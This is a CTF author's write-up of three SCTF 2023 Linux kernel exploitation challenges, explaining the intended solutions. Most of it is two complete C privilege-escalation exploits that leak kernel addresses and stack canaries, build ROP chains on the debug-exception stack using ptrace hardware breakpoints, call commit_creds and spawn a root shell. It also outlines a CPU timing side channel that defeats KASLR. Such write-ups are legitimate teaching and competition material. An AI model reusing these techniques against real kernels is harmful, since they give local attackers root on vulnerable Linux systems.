# SCTF2023_kernelpwn
SCTF 2023 kernel pwn
## sycrop

这道题想考察的是两个点。

1. cpu entry area mapping区域的起始点有几个和内核text段偏移固定的地址，具体参考下图，这只是一个小trick，首次出现在谷歌的KCTF，后面在国际赛中出现过几次

![image](https://github.com/pray77/SCTF2023_kernelpwn/assets/74857519/5533b765-153c-443b-9ce1-a966832bf5eb)

![3Z(ZSS7$2~V)YR~PGD 7%KY](https://github.com/pray77/SCTF2023_kernelpwn/assets/74857519/2f5d94e2-6606-4b78-a7e8-60825135aded)



1. 通过下硬件断点在用户态触发的方式，可以将寄存器内容推送到与per cpu entry area固定偏移的DB stack上，而在linux 6.2之前， per cpu entry area没有加入随机化，地址固定，所以可以达到在内核固定地址造ROP链的手段，这是本题的创新点，笔者暂且命名为： ret2hbp，命名只是方便大家描述这种攻击手法，笔者并不声称独创性，事实上，内核利用的发展路程本身的魅力已经足够吸引人，在海边沙滩上捡到一个贝壳已经足够开心 : )

具体地址和偏移相关参考exp，还是希望各位师傅能自己调试一番

```c
#define _GNU_SOURCE
#include <sched.h>
#include <sys/mman.h>
#include <pthread.h>
#include <semaphore.h>
#include <sys/ptrace.h>
#include <signal.h>
#include <sys/wait.h>
#include <stddef.h>
#include <asm/user_64.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/utsname.h>
#include <stdbool.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/prctl.h>
#include <fcntl.h>

void* map;
#define PAGE_SIZE 0x1000
pid_t hbp_pid;
unsigned long kernel_base;
unsigned long init_cred;
unsigned long commit_cred;
unsigned long pop_rdi;
unsigned long swapgs_restore_regs_and_return_to_usermode;

size_t user_cs, user_ss, user_rflags, user_sp;

void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

void teardown()
{
    kill(hbp_pid,9);
}

void create_hbp(void* addr)
{

    if(ptrace(PTRACE_POKEUSER,hbp_pid, offsetof(struct user, u_debugreg), addr) == -1) {
        printf("Could not create hbp! ptrace dr0: %m\n");
        teardown();
        exit(1);
    }

    if(ptrace(PTRACE_POKEUSER,hbp_pid, offsetof(struct user, u_debugreg) + 56, 0xf0101) == -1) {
        printf("Could not create hbp! ptrace dr7: %m\n");
        teardown();
        exit(1);
    }
}

void hbp_raw_fire()
{
    if(ptrace(PTRACE_CONT,hbp_pid,NULL,NULL) == -1)
        {
            printf("Failed to PTRACE_CONT: %m\n");
            teardown();
            exit(1);
        }
}
void getRootShell(void)
{   
    if(getuid()) {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }

    puts("\033[32m\033[1m[+] Successful to get the root. "
         "Execve root shell now...\033[0m");
    system("/bin/sh");
}
size_t getshelladdr = &getRootShell;
void init(unsigned cpu)
{
    cpu_set_t mask;
    map = mmap((void*) 0x0a000000,0x1000000,PROT_READ | PROT_WRITE,MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED,0,0);
    switch(hbp_pid = fork())
    {
        case 0: //child
            //pin cpu

            CPU_ZERO(&mask);
            CPU_SET(cpu,&mask);
            sched_setaffinity(0,sizeof(mask),&mask);
            ptrace(PTRACE_TRACEME,0,NULL,NULL);
            raise(SIGSTOP);
            __asm__(
                "mov r15,   0xbeefdead;"
                "mov r14,   pop_rdi;"
                "mov r13,   init_cred;" // start at there
                "mov r12,   commit_cred;"
                "mov rbp,   swapgs_restore_regs_and_return_to_usermode;"
                "mov rbx,   0x77777777;"
                "mov r11,   0x77777777;"
                "mov r10,   getshelladdr;"
                "mov r9,    user_cs;"
                "mov r8,    user_rflags;"
                "mov rax,   user_sp;"
                "mov rcx,   user_ss;"
                "mov rdx,   0xcccccccc;"
                "mov rsi,   0xa000000;"
                "mov rdi,   [rsi];"
            );
            exit(1);
        case -1:
            printf("fork: %m\n");
            exit(1);
        default: //parent. Just exit switch
            break;
    }
    int status;
    //Watch for stop:
    puts("Waiting for child");
    while(waitpid(hbp_pid,&status,__WALL) != hbp_pid || !WIFSTOPPED(status))
    {
        sched_yield();
    }
    puts("Setting breakpoint");
    create_hbp(map);
}

int main()
{
    saveStatus();
    int fd = open("/dev/seven", O_RDWR);
    if(fd < 0) perror("Error open");
    unsigned long addr =  ioctl(fd,0x5555,0xfffffe0000000000+4);
    printf("0x%llx\n",addr-0x1008e00);
    kernel_base = addr-0x1008e00;
    init_cred = kernel_base + 0xffffffffbd64cbf8 - 0xffffffffbbc00000;
    commit_cred = kernel_base + 0xffffffffbbcbb5b0 - 0xffffffffbbc00000;
    pop_rdi = kernel_base + 0xffffffff81002c9d - 0xffffffff81000000;
    swapgs_restore_regs_and_return_to_usermode = kernel_base + 0xffffffff82000f01 - 0xffffffff81000000;
    init(1);
    hbp_raw_fire();
    waitpid(hbp_pid,NULL,__WALL);
    hbp_raw_fire();
    waitpid(hbp_pid,NULL,__WALL);
    ioctl(fd,0x6666,0xfffffe0000010f60);
}
```

## sycrpg

事实上，这只是一道1day利用题，基本思路就是谷歌pj0的这一篇文章，笔者所做工作只是把它出成一道CTF题，方便大家学习到这个我个人觉得威力强大且有趣的利用方法，体会只能在一个地址写一个字节就能getshell的魅力。
https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html?m=1


exp

```c
// =-=-=-=-=-=-=-= INCLUDE =-=-=-=-=-=-=-=
#define _GNU_SOURCE

#include <assert.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <syscall.h>
#include <unistd.h>

// =-=-=-=-=-=-=-= DEFINE =-=-=-=-=-=-=-=

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                    \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                     \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                  \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)

#define GLOBAL_MMAP_ADDR ((char *)(0x12340000))
#define GLOBAL_MMAP_LENGTH (0x2000)

// ROP stuff
#define ROP_START_OFF (0x44)
#define CANARY_OFF (0x3d)
#define ROP_CNT (0x80)
#define o(x) (kbase + x)
#define pop_rdi o(0xb26a0)
#define pop_rdx o(0xa9eb57)
#define pop_rcx o(0x3468c3)
#define bss o(0x2595000)
#define dl_to_rdi o(0x20dd24)              // mov byte ptr [rdi], dl ; ret
#define push_rax_jmp_qword_rcx o(0x4d6870) // push rax ; jmp qword ptr [rcx]
#define commit_creds o(0xf8240)
#define prepare_kernel_cred o(0xf8520)
#define kpti_trampoline \
    o(0x10010e6) // in swapgs_restore_regs_and_return_to_usermode
#define somewhere_writable (bss)

// =-=-=-=-=-=-=-= GLOBAL VAR =-=-=-=-=-=-=-=

unsigned long user_cs, user_ss, user_eflags, user_sp, user_ip;

struct typ_cmd {
    uint64_t addr;
    uint64_t val;
};

int vuln_fd;
pid_t child;
pid_t trigger;

int sync_pipe[2][2];

// =-=-=-=-=-=-=-= FUNCTION =-=-=-=-=-=-=-=

void get_shell() {
    int uid;
    if (!(uid = getuid())) {
        logi("root get!!");
        execl("/bin/sh", "sh", NULL);
    } else {
        die("gain root failed, uid: %d", uid);
    }
}

void init_tf_work(void) {
    asm("movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_eflags), "=r"(user_sp)
        :
        : "memory");

    user_ip = (uint64_t)&get_shell;
    user_sp = 0xf000 +
              (uint64_t)mmap(0, 0x10000, 6, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

void bind_cpu(int cpu_idx) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu_idx, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("sched_setaffinity: %m");
    }
}

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

#define DR_OFFSET(num) ((void *)(&((struct user *)0)->u_debugreg[num]))
void create_hbp(pid_t pid, void *addr) {

    // Set DR0: HBP address
    if (ptrace(PTRACE_POKEUSER, pid, DR_OFFSET(0), addr) != 0) {
        die("create hbp ptrace dr0: %m");
    }

    /* Set DR7: bit 0 enables DR0 breakpoint. Bit 8 ensures the processor stops
     * on the instruction which causes the exception. bits 16,17 means we stop
     * on data read or write. */
    unsigned long dr_7 = (1 << 0) | (1 << 8) | (1 << 16) | (1 << 17);
    if (ptrace(PTRACE_POKEUSER, pid, DR_OFFSET(7), (void *)dr_7) != 0) {
        die("create hbp ptrace dr7: %m");
    }
}

void arb_write(int fd) {
    ioctl(fd,0x7204,0x9);
}

void do_init() {
    logd("do init ...");
    init_tf_work();

    vuln_fd = open("/dev/seven", O_RDONLY);
    if (vuln_fd < 0) {
        die("open vuln_fd: %m");
    }

    ioctl(vuln_fd,0x7201,0xfffffe0000010fb0);
    ioctl(vuln_fd,0x7202,1);
    ioctl(vuln_fd,0x7203,0);
    ioctl(vuln_fd,0x7203,0);
    ioctl(vuln_fd,0x7203,0);
    ioctl(vuln_fd,0x7203,0);
    ioctl(vuln_fd,0x7203,0);
    ioctl(vuln_fd,0x7203,0);
    ioctl(vuln_fd,0x7203,0);
    ioctl(vuln_fd,0x7203,0);
    ioctl(vuln_fd,0x7203,0);
    ioctl(vuln_fd,0x7203,0);
    ioctl(vuln_fd,0x7203,0);
    ioctl(vuln_fd,0x7203,0);
    ioctl(vuln_fd,0x7203,0);
    ioctl(vuln_fd,0x7203,0);
    ioctl(vuln_fd,0x7202,1);
    ioctl(vuln_fd,0x7202,1);
    ioctl(vuln_fd,0x7202,1);
    ioctl(vuln_fd,0x7202,1);
    ioctl(vuln_fd,0x7202,1);
    ioctl(vuln_fd,0x7202,1);
    ioctl(vuln_fd,0x7202,1);
    ioctl(vuln_fd,0x7202,1);
    ioctl(vuln_fd,0x7202,1);
    ioctl(vuln_fd,0x7202,1);
    ioctl(vuln_fd,0x7202,2);
    ioctl(vuln_fd,0x7202,2);
    ioctl(vuln_fd,0x7202,2);
    ioctl(vuln_fd,0x7203,1);
    ioctl(vuln_fd,0x7203,2);

    // global mmap
    void *p = mmap(GLOBAL_MMAP_ADDR, GLOBAL_MMAP_LENGTH, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED) {
        die("mmap: %m");
    }

    if (pipe(sync_pipe[0])) {
        die("pipe: %m");
    }
    if (pipe(sync_pipe[1])) {
        die("pipe: %m");
    }
}

void fn_child() {
    logd("child MUST bind to cpu-0");
    bind_cpu(0);

    char *name_buf = (char *)GLOBAL_MMAP_ADDR;
    memset(GLOBAL_MMAP_ADDR, 0, GLOBAL_MMAP_LENGTH);

    // call ptrace
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) != 0) {
        die("ptrace PTRACE_TRACEME: %m");
    }

    uint64_t skip_cnt =
        (sizeof(struct utsname) + sizeof(uint64_t) - 1) / sizeof(uint64_t);

    int step = 0;
    bool loop = true;
    while (loop) {
        // halt, and wait to be told to hit watchpoint
        raise(SIGSTOP);

        switch (step) {
        case 0: {
            // trigger hw_breakpoint and leak data from stack
#if (0)
            *(char *)name_buf = 1; // trigger `exc_debug_user()`
#else
            uname((void *)name_buf); // trigger `exc_debug_kernel()`
#endif
            // check if data leaked
            for (int i = skip_cnt; i < 100; i++) {
                if (((uint64_t *)name_buf)[i]) {
                    logi("child: FOUND kernel stack leak !!");
                    write(sync_pipe[1][1], GLOBAL_MMAP_ADDR,
                          GLOBAL_MMAP_LENGTH);
                    step++;
                    break;
                }
            }
        } break;
        case 1: {
            // build ROP
            logd("child: waiting to recv rop gadget ...");
            read(sync_pipe[0][0], GLOBAL_MMAP_ADDR, GLOBAL_MMAP_LENGTH);
            logd("child: recv rop gadget");
            step++;
        } break;
        case 2: {
            // ROP attack
            prctl(PR_SET_MM, PR_SET_MM_MAP, GLOBAL_MMAP_ADDR,
                  sizeof(struct prctl_mm_map), 0);
        } break;
        default:
            break;
        }
    }

    return;
}

void fn_trigger() {
    logd("trigger: bind trigger to other cpu, e.g. cpu-1");
    bind_cpu(1);

    logd("trigger: modify rcx in cpu-0's `cpu_entry_area` DB_STACK infinitely");
    while (1) {
#define CPU_0_cpu_entry_area_DB_STACK_rcx_loc (0xfffffe0000010fb0)
#define OOB_SIZE(x) (x / 8)
        arb_write(vuln_fd);
    }
}

int main(void) {
    do_init();

    logd("fork victim child ...");
    switch (child = fork()) {
    case -1:
        die("fork child: %m");
        break;
    case 0:
        // victim child
        fn_child();
        exit(0);
        break;
    default:
        // parent wait child
        waitpid(child, NULL, __WALL);
        break;
    }
    logd("child pid: %d", child);

    // kill child on exit
    if (ptrace(PTRACE_SETOPTIONS, child, NULL, (void *)PTRACE_O_EXITKILL) < 0) {
        die("ptrace set PTRACE_O_EXITKILL: %m");
    }

    logd("create hw_breakpoint for child");
    create_hbp(child, (void *)GLOBAL_MMAP_ADDR);

    logd("fork write-anywhere primitive trigger ...");
    switch (trigger = fork()) {
    case -1:
        die("fork trigger: %m");
        break;
    case 0:
        fn_trigger();
        exit(0);
        break;
    default:
        break;
    }

    logd("waiting for stack data leak ...");
    struct pollfd fds = {.fd = sync_pipe[1][0], .events = POLLIN};
    while (1) {
        if (ptrace(PTRACE_CONT, child, NULL, NULL) < 0) {
            die("failed to PTRACE_CONT: %m");
        }
        waitpid(child, NULL, __WALL);

        // use poll() to check if there is data to read
        int ret = poll(&fds, 1, 0);
        if (ret > 0 && (fds.revents & POLLIN)) {
            read(sync_pipe[1][0], GLOBAL_MMAP_ADDR, GLOBAL_MMAP_LENGTH);
            break;
        }
    }

    // leak from come from victim child
    hexdump(GLOBAL_MMAP_ADDR + sizeof(struct utsname), 0x100);
    uint64_t *leak_buffer =
        (uint64_t *)(GLOBAL_MMAP_ADDR + sizeof(struct utsname));
    uint64_t canary = leak_buffer[0];
    logi("canary: 0x%lx", canary);
    uint64_t leak_kaddr = leak_buffer[4];
    logi("leak_kaddr: 0x%lx", leak_kaddr);
    uint64_t kbase = leak_kaddr-0xd7182;
    logi("kbase: 0x%lx", kbase);

    // start build rop gadget ...
    logd("build rop ...");
    uint64_t rop[ROP_START_OFF + ROP_CNT] = {0};
    rop[CANARY_OFF] = canary;
    uint64_t gadget_data = pop_rdi;
    uint64_t rop_buf[ROP_CNT] = {
        // 这里的偏移需要改一下
        // prepare_kernel_cred(0)
        pop_rdi, 0, prepare_kernel_cred,

        // mov qword ptr[somewhere_writable], gadget_data
        pop_rdx, (gadget_data >> (8 * 0)) & 0xff, pop_rdi,
        somewhere_writable + 0, dl_to_rdi, pop_rdx,
        (gadget_data >> (8 * 1)) & 0xff, pop_rdi, somewhere_writable + 1,
        dl_to_rdi, pop_rdx, (gadget_data >> (8 * 2)) & 0xff, pop_rdi,
        somewhere_writable + 2, dl_to_rdi, pop_rdx,
        (gadget_data >> (8 * 3)) & 0xff, pop_rdi, somewhere_writable + 3,
        dl_to_rdi, pop_rdx, (gadget_data >> (8 * 4)) & 0xff, pop_rdi,
        somewhere_writable + 4, dl_to_rdi, pop_rdx,
        (gadget_data >> (8 * 5)) & 0xff, pop_rdi, somewhere_writable + 5,
        dl_to_rdi, pop_rdx, (gadget_data >> (8 * 6)) & 0xff, pop_rdi,
        somewhere_writable + 6, dl_to_rdi, pop_rdx,
        (gadget_data >> (8 * 7)) & 0xff, pop_rdi, somewhere_writable + 7,
        dl_to_rdi,

        // mov rdi, rax
        pop_rcx, somewhere_writable, push_rax_jmp_qword_rcx,

        // commit_creds(cred)
        commit_creds,

        // return to userland
        kpti_trampoline,
        // frame
        0xdeadbeef, 0xbaadf00d, user_ip, user_cs, user_eflags,
        user_sp & 0xffffffffffffff00, user_ss};
    memcpy(rop + ROP_START_OFF, rop_buf, sizeof(rop_buf));

    logd("send rop gadget to victim child ...");
    write(sync_pipe[0][1], rop, sizeof(rop));

    logd("fire ...");
    while (1) {
        if (ptrace(PTRACE_CONT, child, NULL, NULL) < 0) {
            die("failed to PTRACE_CONT: %m");
        }
        waitpid(child, NULL, __WALL);
    }

    while (1) {
        sleep(100);
    }

    return 0;
}
```

## moonpray

这是一道涉及到内核信息泄露0day的题，然而存在了非预期解（两个做出的队伍都是非预期）

题目为去掉了leak的sycrop加强版，因为版本用的是6.2，per cpu entry area添加了随机化

1. 首先还是得leak ，这里涉及的点是CPU 漏洞，注意到启动脚本中的 -enable-kvm和-cpu host，用的是物理机的cpu，事实上，大部分情况下，intel cpu都受到这个漏洞的影响，具体参考1day Entrybleed文章（https://www.willsroot.io/2022/12/entrybleed.html#comment-form），用上面的脚本即可跑出kaslr
2. 接下来的ROP部分，按照sycrop的思路，应该栈迁移到DB stack上，但此时per cpu entry area加入了随机化，所以DB stack也跟着随机化（它在per cpu entry area + 0xf000这个偏移上），但事实上，KPTI开启的情况下，不止系统调用入口点会被映射到用户态（EntryBleed的entry_SYSCALL_64），per cpu entry area也被映射，所以是可以通过预取指令计算时间差的方法得到偏移的，具体脚本得等厂商同意披露才能发（但其实上面已经讲明白了相信师傅们能搓出来）
3. 关于非预期，rop部分可以采用ret2dir，这是笔者的疏忽，出题时也想过ret2dir能不能打，但时间关系完成了题目主体部分居然就忘了管这事了，不过也还好，起码这道题能有解 (

题外话：打个广告 笔者是2024届毕业本科学生，参加今年秋招，在线求工作.jpg
